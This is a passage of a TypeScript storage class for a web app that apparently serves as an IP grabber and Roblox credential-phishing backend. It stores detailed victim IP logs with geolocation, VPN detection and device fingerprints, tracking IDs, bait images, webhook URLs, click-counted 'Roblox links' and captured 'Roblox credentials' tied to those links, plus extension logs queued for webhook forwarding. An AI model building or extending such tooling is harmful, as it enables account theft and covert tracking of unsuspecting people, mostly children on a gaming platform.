      createdAt: new Date()
    };
    this.sessions.set(insertSession.sessionToken, session);
    await this.saveToFileSystem(); // Persist new session
    return session;
  }

  async getSession(token: string): Promise<UserSession | undefined> {
    const session = this.sessions.get(token);
    if (session && session.expiresAt > new Date()) {
      return session;
    }
    if (session) {
      this.sessions.delete(token); // Remove expired session
      await this.saveToFileSystem(); // Persist session deletion
    }
    return undefined;
  }

  async deleteSession(token: string): Promise<void> {
    if (this.sessions.has(token)) {
      this.sessions.delete(token);
      await this.saveToFileSystem(); // Persist session deletion
    }
  }

  async createIpLog(insertIpLog: InsertIpLog): Promise<IpLog> {
    const id = randomUUID();
    const ipLog: IpLog = {
      id,
      userId: insertIpLog.userId || null,
      ipAddress: insertIpLog.ipAddress,
      userAgent: insertIpLog.userAgent || null,
      referrer: insertIpLog.referrer || null,
      location: insertIpLog.location || null,
      status: insertIpLog.status || 'success',
      // Enhanced geolocation fields
      country: insertIpLog.country || null,
      region: insertIpLog.region || null,
      city: insertIpLog.city || null,
      latitude: insertIpLog.latitude || null,
      longitude: insertIpLog.longitude || null,
      timezone: insertIpLog.timezone || null,
      isp: insertIpLog.isp || null,
      organization: insertIpLog.organization || null,
      coordinates: insertIpLog.coordinates || null,
      // Security analysis fields
      isVpn: insertIpLog.isVpn || null,
      isProxy: insertIpLog.isProxy || null,
      threatLevel: insertIpLog.threatLevel || null,
      vpnProvider: insertIpLog.vpnProvider || null,
      realLocation: insertIpLog.realLocation || null,
      // Device fingerprinting fields
      deviceType: insertIpLog.deviceType || null,
      browserName: insertIpLog.browserName || null,
      browserVersion: insertIpLog.browserVersion || null,
      operatingSystem: insertIpLog.operatingSystem || null,
      osVersion: insertIpLog.osVersion || null,
      deviceBrand: insertIpLog.deviceBrand || null,
      deviceModel: insertIpLog.deviceModel || null,
      architecture: insertIpLog.architecture || null,
      engine: insertIpLog.engine || null,
      engineVersion: insertIpLog.engineVersion || null,
      isBot: insertIpLog.isBot || false,
      isSuspicious: insertIpLog.isSuspicious || false,
      securityFlags: insertIpLog.securityFlags || [],
      capabilities: insertIpLog.capabilities || [],
      fingerprint: insertIpLog.fingerprint || null,
      timestamp: new Date(),
    };

    // Store the IP log permanently
    this.ipLogs.set(id, ipLog);

    // Force immediate save for IP logs to ensure they're never lost
    try {
      await this.saveToFileSystem();
      console.log(`✅ IP Log saved permanently: ${ipLog.ipAddress} from ${ipLog.location} - Total logs: ${this.ipLogs.size}`);
    } catch (error) {
      console.error(`❌ Failed to save IP log: ${error}`);
      // Don't throw error to prevent blocking the response
    }

    return ipLog;
  }

  async getIpLogs(userId?: string, limit: number = 50, offset: number = 0): Promise<IpLog[]> {
    let logs = Array.from(this.ipLogs.values());
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    return logs
      .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime())
      .slice(offset, offset + limit);
  }

  async getTotalIpLogs(userId?: string): Promise<number> {
    if (userId) {
      return Array.from(this.ipLogs.values()).filter(log => log.userId === userId).length;
    }
    return this.ipLogs.size;
  }

  async getUniqueIpCount(userId?: string): Promise<number> {
    let logs = Array.from(this.ipLogs.values());
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    const uniqueIps = new Set(logs.map(log => log.ipAddress));
    return uniqueIps.size;
  }

  async getRecentLogs(userId?: string, hours: number = 1): Promise<IpLog[]> {
    const cutoff = new Date(Date.now() - hours * 60 * 60 * 1000);
    let logs = Array.from(this.ipLogs.values()).filter(log => log.timestamp >= cutoff);
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    return logs.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }

  async getSettings(userId?: string): Promise<Settings | null> {
    if (!userId) {
      // This part of the logic seems to be intended for cases where you might want a default or first setting
      // if no specific userId is provided, which might be an edge case.
      // Returning null or throwing an error might be more appropriate if userId is always expected.
      // For now, keeping it as per original structure, but consider refining.
      const settingsArray = Array.from(this.settings.values());
      return settingsArray.length > 0 ? settingsArray[0] : null;
    }
    return this.settings.get(userId) || null;
  }

  async createOrUpdateSettings(insertSettings: InsertSettings): Promise<Settings> {
    const existingSettings = this.settings.get(insertSettings.userId);

    // Log image replacement if applicable
    if (existingSettings?.uploadedImageName && insertSettings.uploadedImageName && 
        existingSettings.uploadedImageName !== insertSettings.uploadedImageName) {
      console.log(`🔄 Image replacement: "${existingSettings.uploadedImageName}" → "${insertSettings.uploadedImageName}"`);
    }

    // Generate trackingId if not present and not provided
    let trackingId = existingSettings?.trackingId;
    if (!trackingId) {
      trackingId = await this.ensureTrackingId(insertSettings.userId);
    }

    const settings: Settings = {
      id: existingSettings?.id || randomUUID(),
      userId: insertSettings.userId,
      trackingId,
      webhookUrl: insertSettings.webhookUrl !== undefined ? insertSettings.webhookUrl : (existingSettings?.webhookUrl || null),
      uploadedImageName: insertSettings.uploadedImageName !== undefined ? insertSettings.uploadedImageName : (existingSettings?.uploadedImageName || null),
      uploadedImageData: insertSettings.uploadedImageData !== undefined ? insertSettings.uploadedImageData : (existingSettings?.uploadedImageData || null),
      uploadedImageType: insertSettings.uploadedImageType !== undefined ? insertSettings.uploadedImageType : (existingSettings?.uploadedImageType || null),
      createdAt: existingSettings?.createdAt || new Date(),
      updatedAt: new Date(),
    };

    this.settings.set(insertSettings.userId, settings);
    await this.saveToFileSystem(); // Persist settings
    return settings;
  }

  async getSettingsByTrackingId(trackingId: string): Promise<Settings | null> {
    for (const setting of Array.from(this.settings.values())) {
      if (setting.trackingId === trackingId) {
        return setting;
      }
    }
    return null;
  }

  async ensureTrackingId(userId: string): Promise<string> {
    const existingSettings = this.settings.get(userId);
    if (existingSettings?.trackingId) {
      return existingSettings.trackingId;
    }

    // Generate a cryptographically secure random tracking ID
    const trackingId = randomUUID().replace(/-/g, ''); // Remove dashes for cleaner URLs

    // Persist the trackingId to storage
    if (existingSettings) {
      // Update existing settings with trackingId
      const updatedSettings: Settings = {
        ...existingSettings,
        trackingId,
        updatedAt: new Date(),
      };
      this.settings.set(userId, updatedSettings);
    } else {
      // Create minimal settings record with trackingId
      const newSettings: Settings = {
        id: randomUUID(),
        userId,
        trackingId,
        webhookUrl: null,
        uploadedImageName: null,
        uploadedImageData: null,
        uploadedImageType: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      };
      this.settings.set(userId, newSettings);
    }

    await this.saveToFileSystem(); // Persist to disk
    return trackingId;
  }

  async getAnySettingsWithImage(): Promise<{ settings: Settings, userId: string } | null> {
    for (const [userId, setting] of Array.from(this.settings.entries())) {
      if (setting.uploadedImageData && setting.uploadedImageData.length > 0) {
        return { settings: setting, userId: userId };
      }
    }
    return null;
  }

  async getAnySettingsWithWebhook(): Promise<{ settings: Settings, userId: string } | null> {
    for (const [userId, setting] of Array.from(this.settings.entries())) {
      if (setting.webhookUrl && setting.webhookUrl.length > 0) {
        return { settings: setting, userId: userId };
      }
    }
    return null;
  }

  async getSettingsWithImageOrWebhook(): Promise<{ settings: Settings, userId: string } | null> {
    console.log(`🔍 Checking settings for ${this.settings.size} users`);

    // First priority: settings with both image and webhook
    for (const [userId, setting] of Array.from(this.settings.entries())) {
      console.log(`👤 User ${userId}: hasImage=${!!setting.uploadedImageData}, hasWebhook=${!!setting.webhookUrl}`);
      if (setting.uploadedImageData && setting.uploadedImageData.length > 0 && setting.webhookUrl && setting.webhookUrl.length > 0) {
        console.log(`✅ Found settings with both image and webhook for user ${userId}`);
        return { settings: setting, userId: userId };
      }
    }

    // Second priority: settings with just image
    for (const [userId, setting] of Array.from(this.settings.entries())) {
      if (setting.uploadedImageData && setting.uploadedImageData.length > 0) {
        console.log(`✅ Found settings with image for user ${userId}`);
        return { settings: setting, userId: userId };
      }
    }

    // Third priority: settings with just webhook
    for (const [userId, setting] of Array.from(this.settings.entries())) {
      if (setting.webhookUrl && setting.webhookUrl.length > 0) {
        console.log(`✅ Found settings with webhook for user ${userId}`);
        return { settings: setting, userId: userId };
      }
    }

    console.log(`❌ No settings with image or webhook found`);
    return null;
  }

  // Roblox Link operations
  async createRobloxLink(robloxLink: InsertRobloxLink): Promise<RobloxLink> {
    const id = randomUUID();
    const now = new Date();
    const newLink: RobloxLink = {
      id,
      ...robloxLink,
      clickCount: 0,
      isActive: true,
      createdAt: now,
      updatedAt: now,
    };
    this.robloxLinks.set(id, newLink);
    return newLink;
  }

  async getRobloxLink(trackingId: string): Promise<RobloxLink | undefined> {
    for (const link of this.robloxLinks.values()) {
      if (link.trackingId === trackingId) {
        return link;
      }
    }
    return undefined;
  }

  async getRobloxLinks(userId: string): Promise<RobloxLink[]> {
    return Array.from(this.robloxLinks.values()).filter(link => link.userId === userId);
  }

  async updateRobloxLinkClicks(trackingId: string): Promise<void> {
    for (const [id, link] of this.robloxLinks.entries()) {
      if (link.trackingId === trackingId) {
        const updatedLink = {
          ...link,
          clickCount: link.clickCount + 1,
          updatedAt: new Date(),
        };
        this.robloxLinks.set(id, updatedLink);
        break;
      }
    }
  }

  async updateRobloxLink(linkId: string, updates: Partial<RobloxLink>): Promise<RobloxLink | undefined> {
    const existingLink = this.robloxLinks.get(linkId);
    if (!existingLink) return undefined;

    const updatedLink = {
      ...existingLink,
      ...updates,
      updatedAt: new Date(),
    };
    this.robloxLinks.set(linkId, updatedLink);
    return updatedLink;
  }

  async deleteRobloxLink(linkId: string, userId: string): Promise<boolean> {
    const link = this.robloxLinks.get(linkId);
    if (!link || link.userId !== userId) {
      return false;
    }
    return this.robloxLinks.delete(linkId);
  }

  // Roblox Credentials operations
  async createRobloxCredentials(credentials: InsertRobloxCredentials): Promise<RobloxCredentials> {
    const id = randomUUID();
    const now = new Date();
    const newCredentials: RobloxCredentials = {
      id,
      ...credentials,
      createdAt: now,
    };
    this.robloxCredentials.set(id, newCredentials);
    return newCredentials;
  }

  async getRobloxCredentials(userId: string): Promise<RobloxCredentials[]> {
    return Array.from(this.robloxCredentials.values()).filter(cred => cred.userId === userId);
  }

  async getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]> {
    return Array.from(this.robloxCredentials.values()).filter(cred => cred.linkId === linkId);
  }

  // Extension Log operations
  async createExtensionLog(extensionLog: InsertExtensionLog): Promise<ExtensionLog> {
    const id = randomUUID();
    const now = new Date();
    const newExtensionLog: ExtensionLog = {
      id,
      ...extensionLog,
      createdAt: now,
      lastWebhookSent: null,
    };
    this.extensionLogs.set(id, newExtensionLog);

    try {
      await this.saveToFileSystem();
      console.log(`✅ Extension Log saved: ${extensionLog.extensionName} - Total logs: ${this.extensionLogs.size}`);
    } catch (error) {
      console.error(`❌ Failed to save extension log: ${error}`);
      // Don't throw error to prevent blocking the response
    }

    return newExtensionLog;
  }

  async getExtensionLogs(userId?: string, limit: number = 50, offset: number = 0): Promise<ExtensionLog[]> {
    let logs = Array.from(this.extensionLogs.values());
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    return logs
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
      .slice(offset, offset + limit);
  }

  async getTotalExtensionLogs(userId?: string): Promise<number> {
    if (userId) {
      return Array.from(this.extensionLogs.values()).filter(log => log.userId === userId).length;
    }
    return this.extensionLogs.size;
  }

  async getRecentExtensionLogs(userId?: string, hours: number = 24): Promise<ExtensionLog[]> {
    const cutoffTime = new Date(Date.now() - hours * 60 * 60 * 1000);
    let logs = Array.from(this.extensionLogs.values()).filter(log => 
      new Date(log.createdAt) > cutoffTime
    );

    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }

    return logs.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  }

  async updateExtensionLogWebhookSent(logId: string): Promise<void> {
    const log = this.extensionLogs.get(logId);
    if (log) {
      this.extensionLogs.set(logId, { 
        ...log, 
        lastWebhookSent: new Date() 
      });
      await this.saveToFileSystem();
    }
  }

  async getExtensionLogsForWebhook(limit: number = 100): Promise<ExtensionLog[]> {
    // Get logs that haven't been sent to webhook recently (within last hour)
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    return Array.from(this.extensionLogs.values())
      .filter(log => !log.lastWebhookSent || new Date(log.lastWebhookSent) < oneHourAgo)
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
      .slice(0, limit);
  }
}

export const storage = new MemStorage();